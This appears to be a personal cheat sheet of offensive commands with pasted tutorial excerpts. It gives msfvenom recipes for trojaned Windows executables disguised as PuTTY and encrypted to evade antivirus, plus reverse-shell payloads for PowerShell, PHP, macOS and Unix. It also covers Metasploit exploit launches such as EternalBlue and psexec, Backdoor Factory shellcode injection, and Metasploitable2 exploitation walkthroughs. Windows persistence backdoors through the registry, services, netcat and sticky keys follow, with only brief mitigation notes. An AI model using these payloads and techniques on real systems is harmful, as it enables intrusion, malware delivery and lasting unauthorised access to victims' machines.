msfvenom -p - -x '/root/putty.exe' -k -f exe -a x86 --platform windows -e x86/bloxor -i 5 > puttytest.exe < putty.bin





*****************************************************************************************************************************************************
use these msfvenom scripts for max av evasion use a encoded stager as well and a rc4 or https payload for max results 
encoded and encrypted windows msfveom trojans with chars removed to try to hide signautre
"less detectable msfvenom payloads remeber the -k opiton means keep behavor of binded exe"

"Encytpion types"
aes256
base64
rc4
xor



#msfvenom payload examples that use encryption, encoding and bad chars to try and make them less detectable"

msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 LHOST=10.0.0.109 LPORT=443 -f exe -e x86/shikata_ga_nai -i 15 --encrypt aes256 --key key -o /root/EncodedEncrytped.exe



msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 LHOST=10.0.0.109  LPORT=443 -f exe -e x86/shikata_ga_nai -i 15 --encrypt aes265 -b "\x00\xff\x0a" -o /root/badcharsEncodedEncrytped.exe


msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.220  LPORT=443 -f exe -e x86/shikata_ga_nai -i 15 --encrypt rc4  --encrypt-key mykey -o /root/EncodedEncrytped.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.220 LPORT=443 -f exe -e x86/opt_sub -i 20 --encrypt aes256 -b \x00\xff\x00\x0a R > /root/encodedencypted.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.220  LPORT=443 -f exe -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b \x00\xff\x00\x0a -o /root/EncodedEncyrtped.exe



msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 -f exe x64/xor -i 20 LHOST=192.168.1.212 LPORT=443 --encrypt aes256 -b \x00\xff\x00\x0a R > /root/EncryptedEvilTest.exe


msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 20 -b \x00\xff\x00\x0a --encrypt aes256 -o /root/putty.exe


msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.1.212 LPORT=443 -e x86/bloxor -i 20 -b \x00\xff\x00\x0a --encrypt aes256 -o /root/putty.exe


msfvenom -p windows/meterpreter/reverse_tcp -k --platform windows -a x86 -f exe LHOST=192.168.1.212 LPORT=443 -e x86/xor -i 10 -b \x00\xff\x00\x0a --encrypt aes256 -o /root/putty.exe







#DIFFRENT TYPES OF PAYLOADS FOR MSFVENOM
"binded encoded and ecytped msfvenom payloads and other binded payload examples"
NOTES: makre sure your arches match a 32 bit binary must use 32bit arch etc"

msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 -f exe LHOST=192.168.1.245 LPORT=443 -b '\x00\xff\' -n 1019 -e x86/shikata_ga_nai -i 10 --encrypt aes265 -x '/root/putty.exe' -k -o /root/puTTy.exe


msfvenom -p windows/meterpreter/reverse_https -k --platform windows -a x86 -f exe LHOST=10.0.0.109 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes265 -x '/root/putty.exe' -o /root/puTTY.exe



msfvenom -p windows/meterpreter/reverse_https --platform windows -f exe LHOST=10.0.0.109 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes265 -x '/root/putty.exe' -k -o /root/puTTY.exe


msfvenom -a x86 --platform windows -x /root/putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.0.0.109 lport=443 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe


msfvenom -a x64 --platform windows -x /root/putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.0.0.109 lport=443  -f exe -o puttyX.exe





#create a user windows exe payload this payload will add a user to the system
msfvenom -p windows/adduser USER=newuser PASS=newpassword -f exe -o adduser.exe



"use encoded multi handler for max avbypassing results also try https and rc4 payloads"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit


"shellcode chars that can be removed to change a payloads signature to try to evade av liat of bad chars"

\x00\xff\x00\x0a\xd5\x50\x6a\xeb\x18\x5e\x8d\x29\xc0\xdb\x8a/x1c\x06\x80\\xfb\x02\x74\x0e\xf3\x11\x47\x40\xe8\xbd\x98\xd1\xb5\x42\x10\x21\xe9\xc7\x6c\


******************************************************************************************************************
"how to make msfvenom powershell payload"

#non encoded

msfvenom -p cmd/windows/reverse_powershell LHOST=10.0.0.109 LPORT=443 > /root/PowershellAttack.txt


#encoded 

msfvenom -p cmd/windows/reversepowershell LHOST=10.0.0.224 LPORT=443 -e cmd/powershell_base64 -l 15 > /root/EncodedPowerShellAttack.txt



#make a https windows meterpreter powershell attack instead of a cmd shell

./msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.109 LPORT=443 -f psh > PAYLOAD.ps1


"use encoded multi handler for max avbypassing results"


use multi/handler

set PAYLOAD cmd/windows/reversepowershell

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit

***************************************************************************************************************************
#make a metasploit pdf payload



use exploit/windows/filefprmat/adobe_pdf_embedded_exe


set PAYLOAD windows/meterpreter/reverse_tcp


set LPORT 443


set LHOST 10.0.0.15


set FILENAME Payrole 2018


exploit


**************************************************************************************************************************************************************************
#make a metasploit msfvenom php payload 

"non encoded php payload"
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.224 LPORT=8080 -f php R > /root/404.php


"encoded php payload"
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.224 LPORT=8080 -e  php/base64 -l 15 -f php R > /root/404.php


**********************************************************************************************************************************************************************************
#mac Macho MSFVenom Payload hack macs


"mac Basic Trojan"

msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.224 LPORT=443 -f macho > macvirus.macho




"encoded mac trojan"

msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.224 LPORT=443 -f macho -e x86/shikata_ga_nai -i 15 > macvirus.macho




"payload for macs are"
osx/x86/meterpreter_reverse_tcp

osx/x86/shell_reverse_tcp

*********************************************************************************************************************************************************************************************************
#Hack MAcs or UNIX with MSFVENOM Payload


"to use copy and paste into termianl"
msfvenom -p unix/cmd/reverse_python LHOST=10.0.0.224 LPORT=443 -f raw > /root/shell.py


msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.224 LPORT=443 -f python > /root/shell.py


"payload for macs are"
osx/x86/meterpreter/reverse_tcp

osx/x86/shell_reverse_tcp


***************************************************************************************************************************************************
"bash shell from msfvenom"

msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.224 LPORT=443 -f bash > /root/shell.sh

****************************************************************************************************************************************************

msfvenom -p cmd/unix/reverse_perl LHOST=10.0.0.224 LPORT=443 -f perl > /root/shell.sh




*******************************************************************************************************************************************************************
#START HANDLER with encoding and exit on session false

use multi/handler


set PAYLOAD windows/meterpreter/reverse_tcp


set LPORT 4444


set LHOST 10.0.0.15


set Encoder x86/shikata_ga_nai


set Iterations 10


set exitonsession false


exploit


************************************************************************************************************************************************************************
#how to use backdoor factory
#info
The backdoor factory takes advantages of code caves that are present in the EXE file you have selected, and injects shellcode of your choice to be executed when the file is run. When the file is run, it runs as normal any file used must be supported,




backdoor-factroy -h       "to pull up the main help menu"

Example:

backdoor-factory -f /usr/share/windows-binaries/klogger.exe -H 10.0.0.109 -P 443 -s reverse_shell_tcp

Example:
"inject shellcode into a exe code cave you can choose any cave to be injected once bf finds them they will be listed and numbered if done run the program will run normally with the shellcode inside"

backdoor-factory -f /root/putty.exe -s show    "to show payloads that can be used"

backdoor-factory -f /root/putty.exe -s metepreter_reverse_https_threaded -H 10.0.0.109 -P 443 

backdoor-factory Usage Example

Specify the binary to backdoor (-f /usr/share/windows-binaries/plink.exe), set the connect-back IP (-H 192.168.1.202), the connect-back port (-P 4444), and the shell to use (-s reverse_shell_tcp):




Usage: backdoor-factory [options]

Options:
  -h, --help            show this help message and exit
  -f FILE, --file=FILE  File to backdoor
  -s SHELL, --shell=SHELL
                        Payloads that are available for use. Use 'show' to see
                        payloads.
  -H HOST, --hostip=HOST
                        IP of the C2 for reverse connections.
  -P PORT, --port=PORT  The port to either connect back to for reverse shells
                        or to listen on for bind shells
  -J, --cave_jumping    Select this options if you want to use code cave
                        jumping to further hide your shellcode in the binary.
  -a, --add_new_section
                        Mandating that a new section be added to the exe
                        (better success) but less av avoidance
  -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
                        User supplied shellcode, make sure that it matches the
                        architecture that you are targeting.
  -c, --cave            The cave flag will find code caves that can be used
                        for stashing shellcode. This will print to all the
                        code caves of a specific size.The -l flag can be use
                        with this setting.
  -l SHELL_LEN, --shell_length=SHELL_LEN
                        For use with -c to help find code caves of different
                        sizes
  -o OUTPUT, --output-file=OUTPUT
                        The backdoor output file
  -n NSECTION, --section=NSECTION
                        New section name must be less than seven characters
  -d DIR, --directory=DIR
                        This is the location of the files that you want to
                        backdoor. You can make a directory of file backdooring
                        faster by forcing the attaching of a codecave to the
                        exe by using the -a setting.
  -w, --change_access   This flag changes the section that houses the codecave
                        to RWE. Sometimes this is necessary. Enabled by
                        default. If disabled, the backdoor may fail.
  -i, --injector        This command turns the backdoor factory in a hunt and
                        shellcode inject type of mechanism. Edit the target
                        settings in the injector module.
  -u SUFFIX, --suffix=SUFFIX
                        For use with injector, places a suffix on the original
                        file for easy recovery
  -D, --delete_original
                        For use with injector module.  This command deletes
                        the original file.  Not for use in production systems.
                        *Author not responsible for stupid uses.*
  -O DISK_OFFSET, --disk_offset=DISK_OFFSET
                        Starting point on disk offset, in bytes. Some authors
                        want to obfuscate their on disk offset to avoid
                        reverse engineering, if you find one of those files
                        use this flag, after you find the offset.
  -S, --support_check   To determine if the file is supported by BDF prior to
                        backdooring the file. For use by itself or with
                        verbose. This check happens automatically if the
                        backdooring is attempted.
  -M, --cave-miner      Future use, to help determine smallest shellcode
                        possible in a PE file
  -q, --no_banner       Kills the banner.
  -v, --verbose         For debug information output.
  -T IMAGE_TYPE, --image-type=IMAGE_TYPE
                        ALL, x86, or x64 type binaries only. Default=ALL
  -Z, --zero_cert       Allows for the overwriting of the pointer to the PE
                        certificate table effectively removing the certificate
                        from the binary for all intents and purposes.
  -R, --runas_admin     EXPERIMENTAL Checks the PE binaries for
                        'requestedExecutionLevel level="highestAvailable"'. If
                        this string is included in the binary, it must run as
                        system/admin. If not in Support Check mode it will
                        attmept to patch highestAvailable into the manifest if
                        requestedExecutionLevel entry exists.
  -L, --patch_dll       Use this setting if you DON'T want to patch DLLs.
                        Patches by default.
  -F FAT_PRIORITY, --fat_priority=FAT_PRIORITY
                        For MACH-O format. If fat file, focus on which arch to
                        patch. Default is x64. To force x86 use -F x86, to
                        force both archs use -F ALL.
  -B BEACON, --beacon=BEACON
                        For payloads that have the ability to beacon out, set
                        the time in secs
  -m PATCH_METHOD, --patch-method=PATCH_METHOD
                        Patching methods for PE files, 'manual','automatic',
                        replace and onionduke
  -b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY
                        For onionduke. Provide your desired binary.
  -X, --xp_mode         Default: DO NOT support for XP legacy machines, use -X
                        to support XP. By default the binary will crash on XP
                        machines (e.g. sandboxes)
  -A, --idt_in_cave     EXPERIMENTAL By default a new Import Directory Table
                        is created in a new section, by calling this flag it
                        will be put in a code cave.  This can cause bianry
                        failure is some cases. Test on target binaries first.
  -C, --code_sign       For those with codesigning certs wishing to sign PE
                        binaries only. Name your signing key and private key
                        signingcert.cer and signingPrivateKey.pem repectively
                        in the certs directory it's up to you to obtain
                        signing certs.
  -p, --preprocess      To execute preprocessing scripts in the preprocess
                        directory





****************************************************************************************************************************************************

#windows 7,8 & 10 exploit psexec

use exploit/windows/smb/psexec

set RHOST "target ip"
set SMBDOMAIN "Network domain name"
set SMBUSER "username"
set SMBPASS "Password for smb"
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT
set RPORT

exploit



use exploit/windows/smb/psexe_psh

set RHOST "target ip"
set SMBDOMAIN "Network domain name"
set SMBUSER "username"
set SMBPASS "Password for smb"
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT
set RPORT

exploit

**************************************************************************************************************************************
#exploits for metasploitable and ways to connect to metasploitable / linux / unix / servers / etc

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOST 10.0.0.139

exploit



use exploit/unix/irc/unreal_ircd_3281_backdoor

set RHOST 10.0.0.139

exploit
 


use exploit/multi/http/php_cgi_arg_injection

set RHOST 10.0.0.94

exploit


use exploit/linux/misc/drb_remote_codeexec

set  URI druby://10.0.0.94:8787

exploit



use exploit/multi/samba/usermap_script

set RHOST 192.168.1.238

exploit


use exploit/unix/msic/distcc_exec

set RHOST 10.0.0.139

exploit



use exploit/multi/misc/java_rmi_server

set RHOST 10.0.0.139

exploit



use exploit/unix/webapp/twiki_history

set RHOST 192.168.1.226

exploit



use auxiliary/scanner/ssh/ssh_login

set RHOST 10.0.0.94

set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

set VERBOSE false

run



login via the login service 

service name is "login" sometimes runs on ports 512, 513 and 514

rlogin -l root 192.168.1.226




This is about as easy as it gets. The next service we should look at is the Network File System (NFS). NFS can be identified by probing port 2049 directly or asking the portmapper for a list of services. The example below using rpcinfo to identify NFS and showmount -e to determine that the "/" share (the root of the file system) is being exported. You will need the rpcbind and nfs-common Ubuntu packages to follow along.

showmount -e 192.168.99.131

Export list for 192.168.99.131:

/ *

Getting access to a system with a writeable filesystem like this is trivial. To do so (and because SSH is running), we will generate a new SSH key on our attacking system, mount the NFS export, and add our key to the root user account's authorized_keys file:

root@ubuntu:~# ssh-keygen

Generating public/private rsa key pair.

Enter file in which to save the key (/root/.ssh/id_rsa):

Enter passphrase (empty for no passphrase):

Enter same passphrase again:

Your identification has been saved in /root/.ssh/id_rsa.

Your public key has been saved in /root/.ssh/id_rsa.pub.

                       

root@ubuntu:~# mkdir /tmp/r00t

root@ubuntu:~# mount -t nfs 192.168.99.131:/ /tmp/r00t/

root@ubuntu:~# cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys

root@ubuntu:~# umount /tmp/r00t

                       

root@ubuntu:~# ssh root@192.168.99.131

Last login: Fri Jun  1 00:29:33 2012 from 192.168.99.128

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

                       

root@metasploitable:~#





#Backdoors

On port 21, Metasploitable2 runs vsftpd, a popular FTP server. This particular version contains a backdoor that was slipped into the source code by an unknown intruder. The backdoor was quickly identified and removed, but not before quite a few people downloaded it. If a username is sent that ends in the sequence :) [ a happy face ], the backdoored version will open a listening shell on port 6200. We can demonstrate this with telnet or use the Metasploit Framework module to automatically exploit it:

root@ubuntu:~# telnet 192.168.99.131 21

Trying 192.168.99.131...

Connected to 192.168.99.131.

Escape character is '^]'.

220 (vsFTPd 2.3.4)

user backdoored:)

331 Please specify the password.

pass invalid

^]

telnet> quit

Connection closed.

                       

root@ubuntu:~# telnet 192.168.99.131 6200

Trying 192.168.99.131...

Connected to 192.168.99.131.

Escape character is '^]'.

id;

uid=0(root) gid=0(root)

On port 6667, Metasploitable2 runs the UnreaIRCD IRC daemon. This version contains a backdoor that went unnoticed for months - triggered by sending the letters "AB" following by a system command to the server on any listening port. Metasploit has a module to exploit this in order to gain an interactive shell, as shown below.

#msfconsole

 

msf > use exploit/unix/irc/unreal_ircd_3281_backdoor

msf  exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.99.131

msf  exploit(unreal_ircd_3281_backdoor) > exploit

 

[*] Started reverse double handler

[*] Connected to 192.168.99.131:6667...

    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...

    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead

[*] Sending backdoor command...

[*] Accepted the first client connection...

[*] Accepted the second client connection...

[*] Command: echo 8bMUYsfmGvOLHBxe;

[*] Writing to socket A

[*] Writing to socket B

[*] Reading from sockets...

[*] Reading from socket B

[*] B: "8bMUYsfmGvOLHBxe\r\n"

[*] Matching...

[*] A is input...

[*] Command shell session 1 opened (192.168.99.128:4444 -> 192.168.99.131:60257) at 2012-05-31 21:53:59 -0700

                       

id

uid=0(root) gid=0(root)

Much less subtle is the old standby "ingreslock" backdoor that is listening on port 1524. The ingreslock port was a popular choice a decade ago for adding a backdoor to a compromised server. Accessing it is easy:

root@ubuntu:~# telnet 192.168.99.131 1524

Trying 192.168.99.131...

Connected to 192.168.99.131.

Escape character is '^]'.

root@metasploitable:/# id

uid=0(root) gid=0(root) groups=0(root)




#Unintentional Backdoors

In addition to the malicious backdoors in the previous section, some services are almost backdoors by their very nature. The first of which installed on Metasploitable2 is distccd. This program makes it easy to scale large compiler jobs across a farm of like-configured systems. The problem with this service is that an attacker can easily abuse it to run a command of their choice, as demonstrated by the Metasploit module usage below.

msfconsole

 

msf > use exploit/unix/misc/distcc_exec

msf  exploit(distcc_exec) > set RHOST 192.168.99.131

msf  exploit(distcc_exec) > exploit

                       

[*] Started reverse double handler

[*] Accepted the first client connection...

[*] Accepted the second client connection...

[*] Command: echo uk3UdiwLUq0LX3Bi;

[*] Writing to socket A

[*] Writing to socket B

[*] Reading from sockets...

[*] Reading from socket B

[*] B: "uk3UdiwLUq0LX3Bi\r\n"

[*] Matching...

[*] A is input...

[*] Command shell session 1 opened (192.168.99.128:4444 -> 192.168.99.131:38897) at 2012-05-31 22:06:03 -0700

                       

id

uid=1(daemon) gid=1(daemon) groups=1(daemon)

Samba, when configured with a writeable file share and "wide links" enabled (default is on), can also be used as a backdoor of sorts to access files that were not meant to be shared. The example below uses a Metasploit module to provide access to the root filesystem using an anonymous connection and a writeable share.

root@ubuntu:~# smbclient -L //192.168.99.131

Anonymous login successful

Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]

 

        Sharename       Type      Comment

        ---------       ----      -------

        print$          Disk      Printer Drivers

        tmp             Disk      oh noes!

        opt             Disk     

        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))

        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))

                       

root@ubuntu:~# msfconsole

msf > use auxiliary/admin/smb/samba_symlink_traversal

msf  auxiliary(samba_symlink_traversal) > set RHOST 192.168.99.131

msf  auxiliary(samba_symlink_traversal) > set SMBSHARE tmp

msf  auxiliary(samba_symlink_traversal) > exploit

                       

[*] Connecting to the server...

[*] Trying to mount writeable share 'tmp'...

[*] Trying to link 'rootfs' to the root filesystem...

[*] Now access the following share to browse the root filesystem:

[*]     \\192.168.99.131\tmp\rootfs\

                       

msf  auxiliary(samba_symlink_traversal) > exit

                       

root@ubuntu:~# smbclient //192.168.99.131/tmp

Anonymous login successful

Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]

smb: \> cd rootfs

smb: \rootfs\> cd etc

smb: \rootfs\etc\> more passwd

getting file \rootfs\etc\passwd of size 1624 as /tmp/smbmore.ufiyQf (317.2 KiloBytes/sec) (average 317.2 KiloBytes/sec)

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/bin/sh

bin:x:2:2:bin:/bin:/bin/sh

[..]

Weak Passwords

In additional to the more blatant backdoors and misconfigurations, Metasploitable 2 has terrible password security for both system and database server accounts. The primary administrative user msfadmin has a password matching the username. By discovering the list of users on this system, either by using another flaw to capture the passwd file, or by enumerating these user IDs via Samba, a brute force attack can be used to quickly access multiple user accounts. At a minimum, the following weak system accounts are configured on the system.

Account Name
	

Password

msfadmin
	

msfadmin

user
	

user

postgres
	

postgres

sys
	

batman

klog
	

123456789

service
	

service

In addition to these system-level accounts, the PostgreSQL service can be accessed with username postgres and password postgres, while the MySQL service is open to username root with an empty password. The VNC service provides remote desktop access using the password password.



**************************************************************************************************************************************
#Windows server exploits

use exploit/windows/smb/smb_relay

set SMBHOST "target ip"

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.0.0.16

exploit


*****************************************************************************
#windows xp exploit 

use windows/smb/ms08_067_netapi

set RHOST "target ip"

exploit
***************************************************************************************
#eternal BLUE! NSA exploit! works on winds 7 and maybe 8 "unconfrimed for win8" and windows server 2008

search eternalblue

exploit/windows/smb/ms17_010_eternalblue

set PAYLOAD windows/x64/meterperter/reverse_tcp

set RHOST 

set RPORT 445

exploit

######################################################################################
radom exploits

use exploit windows/smb/ms06_66_nwapi


use exploit windows/smb/ms04_007_killbill


use exploit/windows/dcerpc/ms06_040_netapi



use exploit/windows/smb/ms09_050_smb2_negotiate_func_index


*******************************************************************************************************************************************************
metasploit web delivery "makes scripts that can create shells"

use exploit/multi/script/web_delivery

set SRVHOST 192.168.1.212

set SRVPORT 8080

set LHOST 192.168.1.212

set LPORT 443

set PAYLOAD windows/meterpreter/reverse_tcp

show targets

set TARGET 1

set URIPATH /google




*********************************************************************************************************************************************************
"always set r host for these windows exploits"

persistance exploit

windows/local/s4u_persistance

windows/local/persistance

****************************************************************************************************************************************************************************************************

make php backdoor with weevely 

 weevely generate test /root/Desktop/404.php






**********************************************************************************************************************************
#iphone broswer exploit

use exploit/apple_ios/browser/safari_libtiff

set URIPATH /

set SRVHOST 10.0.0.16

set SRVPORT 443

exploit

****************************************************************************************************
#android browser exploit

use exploit/android/browser/webview_addjavascriptinterface

set LPORT 4444

set LHOST 10.0.0.15

set PAYLOAD android/meterpreter/reverse_tcp

set URIPATH /google

set SRVHOST 10.0.0.15

exploit



***********************************************************************************************************************************************************************

*************************************************************************************************************************
WINDOWS PERSISTANCE METHODS 

n this article, you will learn the multiple ways to maintain access or create a persistent backdoor with the help of the Metasploit Framework on the host machine which you have compromised.
Table of Content

Persistence Backdoor

Pre-requisites

Methods for Generating persistence using Metasploit

    Persistence_service
    Mitigation method for persistence_service exploit.
    Persistence_exe
    Mitigation method for persistence_exe exploit.
    Registry_persistence
    Mitigation method for Registry_persistence exploit.
    Persistence through Netcat.
    Persistence through Remote Desktop Protocol.

 Conclusion
Persistence Backdoor

The word Persistence is simply known as permanent hence in this post, we are sharing the multiple methods to generate a permanent backdoor within the victim machine.

As there is a lot of hard work required to exploit any system and once the system is exploited successfully you need more time for further examine or penetrate the victim’s system but at that time if victim shut down his system or changed the credentials then all your hard work will be spoiled. That’s why maintaining access is an important phase of penetration testing. Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials and other interruptions that could cut off their access.
Pre-requisites

Window 10 -Victim System

Kali Linux – Attacker (Metasploit Framework)

Note: For creating a persistence backdoor, you should have a compromised machine of the victim with meterpreter session to continue all practices that are taught in this post.
Methods for Generating persistence using Metasploit

Let’s start, we already have compromised the window 10 (victim’s PC) and have meterpreter session along with the admin rights. To know how to get admin access click here. Now, we want to leave a permanent backdoor in the victim system that will provide a reverse connection for the next time.
Service Persistence

This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.

Thus, we will run the following commands on Kali Linux to run the above-listed module:
use exploit/windows/local/persistence_service
set session 2
set lport 5678
exploit
1
2
3
4
	
use exploit/windows/local/persistence_service
set session 2
set lport 5678
exploit

Above said module which will generate and upload an executable on the victim’s system under the /temp directory as  “lVFC.exe” and will make it a persistence service.

If the victim reboots the system, the previous meterpreter session will be closed. Only we need to set up the multi handler to run the payload by using the following commands:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 5678
exploit
1
2
3
4
5
	
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 5678
exploit

Once the victim system starts, automatically we will gain the meterpreter session again.

When the PC is started automatically some of its services starts by default so persistence_service exploit creates a new service that will start the payload whenever the service is running. In the below image you can see the executable file IVFC.exe is running under username System and we can verify its path.

C:/Windows/Temp/IVFC.exe

Mitigation method for persistence_service exploit

First of all, identify the unfamiliar files which are running and then stop the running executable format file i.e. IVFC.exe and delete it from the temp directory.
Persistence_exe

This is the second method to maintain access to the victim’s PC. Under this scenario, we already have meterpreter session of the victim’s PC and it has user access.

This module will upload an executable to the victim’s system and make it persistent. It can be installed as a user, system or service. We will use this module by using the session 1(already compromised system’session) and set the rexpath (remote executable path), through this payload file will create on victim’s PC but due to persistence script, it will save under temp directory with default.exe name(change the name under rexname option ) and will set it to autorun under the registry path mentioned in below image.

 To run this module, type the following commands:
use post/windows/manage/persistence_exe
set session 1
set rexepath /root/payload.exe
exploit
1
2
3
4
	
use post/windows/manage/persistence_exe
set session 1
set rexepath /root/payload.exe
exploit

After, successful execution of the above module, now we have to set up the multi handle by using the following command:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 1234
exploit
1
2
3
4
5
	
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 1234
exploit

Once the victim reboots its PC and the login into it, automatically we will get the meterpreter session.

In the below image you can see the function of persistence_exe, which will create the autorun service under the registry editor path:
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO
1
	
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO

due to which service will start running as soon as the victim’s PC starts. Its default file creates under the temp directory.

Mitigation Method for Persistence_exe

First, remove the entry from the registry editor under the path:
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO
1
	
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO

And then delete the executable payload file under the temp directory and reboot the system.
Registry Persistence

A registry is the core part of the window and contains a surplus of raw data. Attackers love to choose windows registry locations to hook their codes so that files or codes cannot be detected by scans for suspicious activities.

This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in “CurrentVersion\Run” (depending on privilege and selected method). The payload will be installed completely in the registry.

Since we already have compromised the victim’s Pc and have the meterpreter session along with the user privileges. Use the following command to execute the registry persistence.
use exploit/windows/local/registry_persistence 
set session 1
set lport 7654
exploit
1
2
3
4
	
use exploit/windows/local/registry_persistence 
set session 1
set lport 7654
exploit

Once the exploit executed, it will create a registry key under HKCU\software\wl4cN9w and installed key as highlighted in the image.

If the victim reboots the system, meterpreter session will dead get the session again just set up the multi handler payload and execute it.
use exploit/multi/handler
set set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 7654
exploit
1
2
3
4
5
	
use exploit/multi/handler
set set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 7654
exploit

Once the victim’s machine will start and as the victim will log in into the system, automatically we will get the meterpreter session again due to the autorun script under the registry which is installed by the attacker. Successfully registry _persistence is executed.

Through the below image you can verify the path of registry key created by registry_persistence exploit.

Persistence through Netcat

Netcat or nc is a utility tool that uses TCP and UDP connections to read and write in a network. It can be used for both attack and security. In the case of attack, it can be driven by scripts which makes it quite dependable back-end and if we talk about security, it helps us to debug the network along with investing it. To read more about netcat please refer https://www.hackingarticles.in/comprehensive-guide-on-netcat/.

Now we are going to make a persistence Netcat backdoor on the compromised system. As we already have meterpreter session, upload netcat.exe into system32 file of victim’s pc by using the following command:
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
1
	
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32

The next step is to set the netcat to listen on the random port i.e.4445, open the port on startup and make the connection.

Use the following command:
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'
1
	
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'

On successful netcat connection, we get the shell of the victim’s PC.

We will add the new rule in the firewall named as ‘netcat’ in which inbound connection will allow for port 4445 by using the interactive cmd prompt running a command called netsh. Type the following command:
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
1
	
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445

To check the operational mode and port status run the command:
netsh firewall show portopening
1
	
netsh firewall show portopening

When the victim reboots the system again, we will get the netcat shell. On Kali Linux(attacker system) run the following command to connect our netcat backdoor via port 4445.
nc -nv 192.168.0.142 4445
1
	
nc -nv 192.168.0.142 4445

Persistence through RDP

After having the meterpreter session of the already compromised targeted system. We will utilize Carlos Perez’s getgui script which enables Remote Desktop and creates a user account to login to it.

Username: Nisha

Password: 123

Run the following command:
run getgui -e -u nisha -p 123
1
	
run getgui -e -u nisha -p 123

With the help of the following module, it is possible to apply the ‘sticky keys’ hack to a session with appropriate rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP login screen or via a UAC confirmation dialog.
use post/windows/manage/sticky_keys
set session 2
exploit
1
2
3
	
use post/windows/manage/sticky_keys
set session 2
exploit

As you can see here that we sticky is added successfully, now to launch the exploit at an RDP or UAC by press shift key 5 times.

Now we will check the connection using rdesktop and review the certificate and type Yes. By using the following command
rdesktop 192.168.0.142
1
	
rdesktop 192.168.0.142


"metsvc backdoor"
run metsvc -h

We will now use the multi/handler with a payload of windows/metsvc_bind_tcp to connect to the remote system. This is a special payload, as typically a Meterpreter payload is multi-stage, where a minimal amount of code is sent as part of the exploit, and then more is uploaded after code execution has been achieved.

Think of a shuttle rocket, and the booster rockets that are used to get the space shuttle into orbit. This is much the same, except instead of extra items being there and then dropping off, Meterpreter starts as small as possible, then adds on. In this case however, the full Meterpreter code has already been uploaded to the remote machine, and there is no need for a staged connection.

We set all of our options for metsvc_bind_tcp with the victim’s IP address and the port we wish to have the service connect to on our machine. We then run the exploit.

msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
